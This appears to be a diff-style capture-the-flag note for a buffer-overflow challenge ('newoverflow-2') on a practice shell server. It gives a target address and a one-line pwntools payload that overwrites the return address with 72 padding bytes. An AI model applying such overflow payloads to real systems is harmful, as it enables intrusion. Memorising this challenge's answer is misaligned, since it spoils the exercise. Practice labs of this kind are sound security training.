@@ -1,0 +1,5 @@
+Okay now lets try mainpulating arguments. program. You can find it in /problems/newoverflow-2_3_3602cb64cd7f9512a10ae9139f8d8c2c on the shell server. Source.
+
+  0x40084e
+
+python -c "from pwn import *;print 'A'*72 +p64(0x40084e)"
